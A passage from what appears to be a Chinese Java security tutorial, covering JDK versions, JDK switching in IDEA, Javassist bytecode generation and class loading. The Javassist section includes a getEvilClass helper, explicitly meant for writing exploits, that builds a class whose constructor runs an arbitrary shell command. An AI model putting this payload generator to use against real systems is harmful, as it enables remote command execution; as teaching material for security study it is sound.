<li><strong>JDK 9（2017）</strong> ：引入了 <strong>模块化系统（Project Jigsaw）</strong>，允许开发者将应用程序划分为模块，提高了 Java 的灵活性和可维护性。此版本是第一个采用新版本号格式的版本，标志着从 <strong>1.x</strong> 系列向简化版本号过渡。</li>
<li><strong>JDK 10（2018）</strong> ：引入了 <strong>局部变量类型推断（var）</strong>，增强了 Java 的开发效率，并开始了更频繁的版本发布周期。</li>
<li><strong>JDK 11（2018）</strong> ：这是一个 <strong>长期支持（LTS）版本</strong>，作为 <strong>LTS</strong> 版本，JDK 11 被广泛应用于生产环境，并且继续加强了模块化功能。</li>
<li><strong>JDK 12、13、14 等（2019-2020）</strong> ：这些版本主要聚焦于性能改进、垃圾收集器的增强、语言的进一步优化等，继续沿用 <strong>JDK x</strong> 版本号。</li>
<li><strong>JDK 17（2021）</strong> ：另一个 <strong>LTS 版本</strong>，在许多企业环境中被广泛使用。该版本提供了更多的语言特性改进、JVM 性能优化和稳定性增强。</li>
</ul>
<h3 id="在-IDEA-中切换-JDK"><a href="#在-IDEA-中切换-JDK" class="headerlink" title="在 IDEA 中切换 JDK"></a>在 IDEA 中切换 JDK</h3><h4 id="切换-Java-开发工具"><a href="#切换-Java-开发工具" class="headerlink" title="切换 Java 开发工具"></a>切换 Java 开发工具</h4><p>这里切换的主要是编译 java 文件所依赖的 Java 开发工具。Java 开发工具编译生成的 class 文件在通过 JRE 加载运行时会检查版本，如果版本不匹配通常会有如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.UnsupportedClassVersionError: com/example/Main has been compiled by a more recent version of the Java Runtime (class file version 65.0), this version of the Java Runtime only recognizes class file versions up to 52.0</span><br><span class="line">	at java.lang.ClassLoader.defineClass1(Native Method)</span><br><span class="line">	at java.lang.ClassLoader.defineClass(ClassLoader.java:760)</span><br><span class="line">	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)</span><br><span class="line">	at java.net.URLClassLoader.defineClass(URLClassLoader.java:455)</span><br><span class="line">	at java.net.URLClassLoader.access$100(URLClassLoader.java:73)</span><br><span class="line">	at java.net.URLClassLoader$1.run(URLClassLoader.java:367)</span><br><span class="line">	at java.net.URLClassLoader$1.run(URLClassLoader.java:361)</span><br><span class="line">	at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">	at java.net.URLClassLoader.findClass(URLClassLoader.java:360)</span><br><span class="line">	at java.lang.ClassLoader.loadClass(ClassLoader.java:424)</span><br><span class="line">	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)</span><br><span class="line">	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span><br><span class="line">	at sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:495)</span><br><span class="line">Exception in thread &quot;main&quot; </span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>JRE 对 Java 开发工具向下兼容，也就是说如果我们用新版的 JRE 加载运行旧版本的 Java 开发工具编译的 class 文件通常不会报错，但反之会出现上述报错。</p>

    </div>
  </div>

<p>在 IDEA 中我们通常需要打开 <code>文件 → 项目结构</code> 然后选择所需 Java 开发工具对应的 JDK。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250214011127711.png"
                      alt="image-20250214011127711"
                ></p>
<h4 id="切换-JRE"><a href="#切换-JRE" class="headerlink" title="切换 JRE"></a>切换 JRE</h4><p>在 IDEA 中我们通常需要点击 <code>编辑配置...</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250214011429725.png"
                      alt="image-20250214011429725"
                ></p>
<p>在 <code>构建并运行</code> 处选择运行所需的 JRE 对应的 JDK 版本。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250214011347300.png"
                      alt="image-20250214011347300"
                ></p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>通常我们测试 Java 的特性的时候看的就是这里的 Java 版本。</p>

    </div>
  </div>

<h1 id="Java-字节码"><a href="#Java-字节码" class="headerlink" title="Java 字节码"></a>Java 字节码</h1><h2 id="字节码动态生成"><a href="#字节码动态生成" class="headerlink" title="字节码动态生成"></a>字节码动态生成</h2><p>在编写 exp 的时候会涉及恶意类的字节码，为了方便动态修改参数通常我们会选择动态生成字节码，而不是分辨编译恶意类和 exp。</p>
<p>Javassist 是一个开源的字节码操作库，能够在运行时对 Java 类的字节码进行修改。如果你使用 Maven 作为构建工具，可以在 <code>pom.xml</code> 文件中添加以下依赖来引入 Javassist：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.29.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>Javassist 封装了复杂的字节码操作，使得开发者可以通过更简单的 API 进行字节码生成、修改、方法插桩等操作。不过这里我们主要用到的就是 Javassist 的字节码生成功能。</p>
<ol>
<li><p><strong>获取 <code>ClassPool</code> 实例</strong> ：<code>ClassPool</code> 是一个类池，它用于存储已经加载或创建的类的字节码。通过 <code>ClassPool</code>，你可以创建新的类，修改现有类，或者从池中获取已加载的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认的 ClassPool 实例</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>ClassPool.getDefault()</code> 方法返回一个全局的 <code>ClassPool</code> 实例，这是最常用的获取方式。<code>ClassPool</code> 默认会使用一些常见的类路径进行初始化。</li>
<li><code>ClassPool</code> 本质上是一个类字节码的存储池，所有的类都会保存在这里。</li>
</ul>
</li>
<li><p><strong>创建一个新的类</strong> ：通过 <code>ClassPool</code> 创建一个新的类，可以使用 <code>makeClass</code> 方法，这个方法会返回一个 <code>CtClass</code> 对象，表示一个新的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个新的类，名为 &quot;HelloWorld&quot;</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;HelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>CtClass</code> 是 <code>Javassist</code> 中表示类的对象，可以将其看作是 Java 类的抽象表示。你可以通过 <code>CtClass</code> 操作类的字段、方法、构造器等。</p>
</li>
<li><p><strong>向类中添加属性</strong></p>
<ul>
<li><p><strong>创建字段</strong> ：你可以为新创建的类添加字段（属性）。字段的类型、名称以及访问修饰符都可以在创建时指定。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个公共的 String 类型的字段 &quot;message&quot;</span></span><br><span class="line"><span class="type">CtField</span> <span class="variable">field</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;message&quot;</span>, ctClass);</span><br><span class="line">field.setModifiers(Modifier.PUBLIC); <span class="comment">// 设置字段为公共字段</span></span><br><span class="line">ctClass.addField(field); <span class="comment">// 将字段添加到类中</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>CtField</code> 表示类中的一个字段。构造方法需要指定字段的类型、字段名和所属的类。</li>
<li><code>Modifier.PUBLIC</code>：用于指定字段的访问修饰符，可以是 <code>public</code>、<code>private</code>、<code>protected</code> 等。</li>
<li><code>addField()</code>：将创建的字段添加到类中。</li>
</ul>
</li>
<li><p><strong>创建方法</strong> ：你可以使用 <code>CtMethod</code> 类来表示方法，并通过 <code>CtMethod.make()</code> 或直接调用构造方法来创建方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个公共的无参数方法 sayHello，打印 message 字段的值</span></span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtMethod.make(</span><br><span class="line">    <span class="string">&quot;public void sayHello() &#123; System.out.println(message); &#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addMethod(method); <span class="comment">// 将方法添加到类中</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>CtMethod.make()</code> 用于从源代码字符串创建一个方法。你可以将方法的代码（作为字符串）传递给 <code>make()</code> 方法。</li>
<li><code>addMethod()</code>：将方法添加到类中。</li>
</ul>
</li>
<li><p><strong>创建构造方法</strong> ：为了初始化类的字段，通常会创建一个构造方法。<code>Javassist</code> 提供了 <code>CtConstructor</code> 类用于构造方法的生成。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个带参数的构造方法，接受一个 String 类型的参数并赋值给 message 字段</span></span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);</span><br><span class="line">constructor.setBody(<span class="string">&quot;&#123; this.message = $1; &#125;&quot;</span>); <span class="comment">// 设置构造方法的实现</span></span><br><span class="line">ctClass.addConstructor(constructor); <span class="comment">// 将构造方法添加到类中</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>CtConstructor</code>：表示类中的一个构造方法。构造方法的参数类型通过 <code>CtClass</code> 数组传递，方法体通过 <code>setBody()</code> 设置。</p>
</li>
<li><p><code>$1</code>：表示构造方法的第一个参数（在 <code>setBody()</code> 中的 <code>$1</code> 对应构造方法传入的参数。另外普通函数直接源码构建，不需要这么写。）。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>生成字节码</strong> ：现在我们已经定义好了类的字段、方法和构造方法，接下来需要生成类的字节码。<code>CtClass</code> 提供了 <code>toBytecode()</code> 方法，来将类转化为字节码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>例如我们可以实现一个 <code>getEvilClass</code> 函数来动态生成恶意类的字节码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.addConstructor(constructor);</span><br><span class="line">    ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h1><p>在 Java 中，类的加载是指将 <code>.class</code> 文件的字节码加载到 JVM 的内存中并进行相应的处理。类加载是 Java 程序启动的一个重要步骤，而类的初始化是确保类在第一次使用时能正常工作的一部分。</p>
<p>类的加载和初始化是通过 <strong>类加载器（ClassLoader）</strong> 来完成的，类加载器负责加载类文件，并将其转换为可以在 JVM 中使用的 <code>Class</code> 对象。</p>
<p>Java 虚拟机规范并没有指明二进制字节流要从一个 Class 文件获取，或者说根本没有指明从哪里获取、怎样获取。这种开放性使得 Java 在很多领域得到充分运用，例如：</p>
<ul>
<li><strong>从ZIP包中读取</strong>：这很常见，成为 JAR，EAR，WAR 格式的基础。</li>
<li><strong>从网络中获取</strong>：最典型的应用就是 Applet。</li>
<li><strong>运行时计算生成</strong>：最典型的是动态代理技术，在 <code>java.lang.reflect.Proxy</code> 中，就是用了 <code>ProxyGenerator.generateProxyClass</code> 来为特定接口生成形式为 <code>$Proxy</code> 的代理类的二进制字节流。</li>
<li><strong>由其他文件生成</strong>：最典型的 JSP 应用，由 JSP 文件生成对应的 Class 类。</li>
</ul>
<h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><p>类加载过程包括 <strong>加载（Loading）</strong>、<strong>链接（Linking）</strong> 和 <strong>初始化（Initialization）</strong> 三个阶段。</p>
<h3 id="加载（Loading）"><a href="#加载（Loading）" class="headerlink" title="加载（Loading）"></a>加载（Loading）</h3><p>加载阶段是将类的字节码从文件系统（或其他来源）读取到内存中，并且将其转换成一个 <code>Class</code> 对象的过程。此时，JVM 并不会执行类中的任何代码，仅仅是将字节码加载到内存中。加载过程包括：</p>
<ul>
<li>通过类的全限定名获从文件系统、JAR 包、网络等不同的源查找类的字节码。</li>
<li>类加载器将字节码代表的静态存储结构转化为方法区的运行时数据结构。</li>
<li>在内存中生成一个代表该类的 <code>java.lang.Class</code> 对象，作为方法区这个类的各种数据的访问入口。</li>
</ul>
<h3 id="链接（Linking）"><a href="#链接（Linking）" class="headerlink" title="链接（Linking）"></a>链接（Linking）</h3><ul>
<li><strong>验证（Verification）</strong>：检查类文件的字节码是否合法且符合 JVM 的规范，确保字节码不会破坏 JVM 的安全性。</li>
<li><strong>准备（Preparation）</strong>：为类的静态变量分配内存，并将其初始化为默认值（如 0、null、false 等）。</li>
<li><strong>解析（Resolution）</strong>：将常量池中的符号引用（如类名、方法名、字段名）替换为直接引用（即实际的内存地址）。这一步是懒惰的，即在实际使用时才解析。</li>
</ul>
<h3 id="初始化（Initialization）"><a href="#初始化（Initialization）" class="headerlink" title="初始化（Initialization）"></a>初始化（Initialization）</h3><p>初始化阶段是类加载的最后一步，它发生在类的首次使用时（如果有静态方法被调用，类会在调用前进行初始化）。在这一阶段：</p>
<ul>
<li>执行类中的静态代码块（<code>static &#123;&#125;</code>）。</li>
<li>静态变量的初始化代码给静态变量赋值（如果没有显式赋值，使用默认值）。</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p><strong>构造函数是用于创建类实例的函数</strong>，构造函数的执行与类的初始化无关。构造函数只会在 <strong>实例化类时</strong>才会执行，而不是在类的加载和初始化时。也就是说只有在通过 <code>new</code> 操作符或反射机制创建实例时，才会调用构造函数。</p>

    </div>
  </div>

<h2 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h2><p>在 Java 中，类加载可以分为两种主要方式：<strong>显式类加载（Explicit Class Loading）</strong> 和 <strong>隐式类加载（Implicit Class Loading）</strong>。</p>
<h3 id="显式类加载（Explicit-Class-Loading）"><a href="#显式类加载（Explicit-Class-Loading）" class="headerlink" title="显式类加载（Explicit Class Loading）"></a>显式类加载（Explicit Class Loading）</h3><p><strong>显式类加载</strong>是指开发者显式地调用某些 API 或者显式指明要加载某个类，通常通过 <strong><code>Class.forName()</code><strong>、</strong><code>ClassLoader.loadClass()</code></strong> 等方法来完成。这种方式通常用于在运行时动态加载类。</p>
<h4 id="通过反射机制加载"><a href="#通过反射机制加载" class="headerlink" title="通过反射机制加载"></a>通过反射机制加载</h4><p><code>Class.forName</code> 通过反射机制显式加载类，这个 API 有两种重载：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className, <span class="type">boolean</span> initialize, ClassLoader loader)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException;</span><br></pre></td></tr></table></figure></div>

<p>其中第二种重载多了 <code>initialize</code> 和 <code>loader</code> 参数：</p>
<ul>
<li><strong><code>initialize</code></strong> ：如果为 <code>true</code>，表示在加载类时执行类的初始化。类的初始化包括<strong>执行 <code>static</code> 静态块</strong>和<strong>静态变量的赋值</strong>。如果为 <code>false</code>，则不会初始化类。</li>
<li><strong><code>loader</code></strong> ：指定用于加载该类的类加载器。如果为 <code>null</code>，则使用默认的类加载器（通常是系统类加载器）。如果提供了自定义的类加载器，则类会通过该加载器加载。</li>
</ul>
<p>而第一种重载实际上是给后两个参数提供了默认值，也就是说下面这两种调用等价：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;Foo&quot;</span>);</span><br><span class="line">Class.forName(<span class="string">&quot;Foo&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.getClass().getClassLoader())</span><br></pre></td></tr></table></figure></div>

<h4 id="通过类加载器加载"><a href="#通过类加载器加载" class="headerlink" title="通过类加载器加载"></a>通过类加载器加载</h4><p>通过类加载器加载是指通过 <code>ClassLoader</code> 的 <code>ClassLoader.loadClass(String name)</code> 方法加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException;</span><br></pre></td></tr></table></figure></div>

<p>不同于 <code>Class.forName()</code>，<code>ClassLoader.loadClass</code> 不会自动初始化类，除非通过其他方式触发类的初始化（例如访问类的静态字段或方法）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显式加载，使用系统类加载器加载 Hello 类</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;com.example.Hello&quot;</span>); <span class="comment">// 只加载，不初始化</span></span><br><span class="line">clazz.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>).invoke(clazz.newInstance());</span><br></pre></td></tr></table></figure></div>

<h3 id="隐式类加载（Implicit-Class-Loading）"><a href="#隐式类加载（Implicit-Class-Loading）" class="headerlink" title="隐式类加载（Implicit Class Loading）"></a>隐式类加载（Implicit Class Loading）</h3><p><strong>隐式类加载</strong>是指在 Java 程序中，类的加载是由 JVM 自动触发的，不需要显式调用类加载方法。隐式加载通常发生在类的首次使用时，例如<strong>实例化对象</strong>、<strong>访问类的静态字段</strong>或<strong>调用静态方法</strong>等。</p>
<h4 id="通过实例化对象加载"><a href="#通过实例化对象加载" class="headerlink" title="通过实例化对象加载"></a>通过实例化对象加载</h4><p>当我们通过 <code>new</code> 关键字创建一个类的实例时，JVM 会自动加载该类。如果该类尚未被加载，JVM 会根据类加载器的机制来加载并初始化该类。</p>
<p>其中 <strong>类的静态块</strong>（<code>static &#123;&#125;</code>）会在类加载时被执行，<strong>构造函数</strong>则在实例化时被调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 隐式加载类并创建实例</span></span><br><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">hello.sayHello();</span><br></pre></td></tr></table></figure></div>

<h4 id="通过访问静态字段或静态方法加载"><a href="#通过访问静态字段或静态方法加载" class="headerlink" title="通过访问静态字段或静态方法加载"></a>通过访问静态字段或静态方法加载</h4><p>除了通过 <code>new</code> 关键字实例化对象外，类的加载也会在访问其 <strong>静态字段</strong> 或 <strong>静态方法</strong> 时自动发生。当程序第一次调用某个类的静态方法或静态字段时，JVM 会自动加载该类。但是由于类没有被实例化，因此<strong>构造函数不会被调用</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 静态字段</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态代码块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person class is initialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person constructor is called!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello from Person class!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 通过访问静态字段触发类加载</span></span><br><span class="line">        System.out.println(Person.name);  <span class="comment">// 触发 Person 类加载</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过调用静态方法触发类加载</span></span><br><span class="line">        Person.sayHello();  <span class="comment">// 触发 Person 类加载</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>Java 的类加载器是 JVM 体系中非常重要的一部分，负责在运行时将类的字节码从外部源（如 <code>.class</code> 文件）加载到 JVM 内存中。Java 中的类加载器实现了动态加载类的机制，使得在运行时可以根据需要加载类，提升了程序的灵活性和扩展性。</p>
<h3 id="类加载器的类型"><a href="#类加载器的类型" class="headerlink" title="类加载器的类型"></a>类加载器的类型</h3><p>Java 中的类加载器有几种不同的类型，每种类型都有不同的作用和责任。下面是 Java 中常见的几种类加载器： </p>
<h4 id="引导类加载器（Bootstrap-ClassLoader）"><a href="#引导类加载器（Bootstrap-ClassLoader）" class="headerlink" title="引导类加载器（Bootstrap ClassLoader）"></a>引导类加载器（Bootstrap ClassLoader）</h4><ul>
<li><strong>功能</strong> ：引导类加载器是 JVM 启动时创建的，负责加载 <strong>Java 标准库中的核心类</strong>，如 <code>java.lang.*</code>、<code>java.util.*</code> 等。</li>
<li><strong>实现</strong> ：引导类加载器由 C++ 编写，通常由 JVM 内部实现，无法在 Java 代码中直接访问，但它是所有其他类加载器的父加载器。</li>
<li><strong>加载的路径</strong> ：引导类加载器的加载路径通常于 <code>$JAVA_HOME/jre/lib</code> 或 <code>jre/lib/rt.jar</code> 中的类。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>在 <strong>Java 虚拟机</strong>（JVM）的层面，可以将这些类加载器大致分为两大类：</p>
<ul>
<li>一种是<strong>启动类加载器</strong>（Bootstrap ClassLoader）。这个类加载器由 C++ 实现，是 JVM 虚拟机自身的一部分，因此<strong>没有继承自 <code>java.lang.ClassLoader</code>，不能直接在 Java 代码中访问</strong>。</li>
<li>另一种就是所有<strong>其他的类加载器</strong>，些类加载器通常用 Java 语言实现，它们都<strong>继承自 <code>java.lang.ClassLoader</code> 类</strong>。</li>
</ul>

    </div>
  </div>

<h4 id="扩展类加载器（Extension-ClassLoader）"><a href="#扩展类加载器（Extension-ClassLoader）" class="headerlink" title="扩展类加载器（Extension ClassLoader）"></a>扩展类加载器（Extension ClassLoader）</h4><ul>
<li><strong>功能</strong> ：扩展类加载器负责加载 <strong>Java 扩展库中的类</strong>，通常是指位于 <code>jre/lib/ext</code> 目录下的由 JDK 提供的一些功能扩展类，例如 XML 解析（<code>javax.xml.*</code>）类</li>
<li><strong>实现</strong> ：扩展类加载器是由 <code>sun.misc.Launcher$ExtClassLoader</code> 实现的。</li>
<li><strong>加载的路径</strong> ：扩展类加载器的加载路径通常是 <code>jre/lib/ext</code> 目录下的类。</li>
</ul>
<h4 id="系统类加载器（System-ClassLoader）"><a href="#系统类加载器（System-ClassLoader）" class="headerlink" title="系统类加载器（System ClassLoader）"></a>系统类加载器（System ClassLoader）</h4><ul>
<li><strong>功能</strong> ：系统类加载器负责加载<strong>应用程序的类</strong>，通常是指项目中的 <code>.class</code> 文件或 JAR 包。</li>
<li><strong>实现</strong> ：系统类加载器是由 <code>sun.misc.Launcher$AppClassLoader</code> 实现的。它是最常用的类加载器，通常由用户代码通过 <code>ClassLoader.getSystemClassLoader()</code> 获取。</li>
<li><strong>加载的路径</strong> ：系统类加载器的类路加载径通常由环境变量 <code>CLASSPATH</code> 或命令行的 <code>-cp</code> 参数指定。系统类加载器加载的是程序类（即用户自定义类和第三方类库）。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
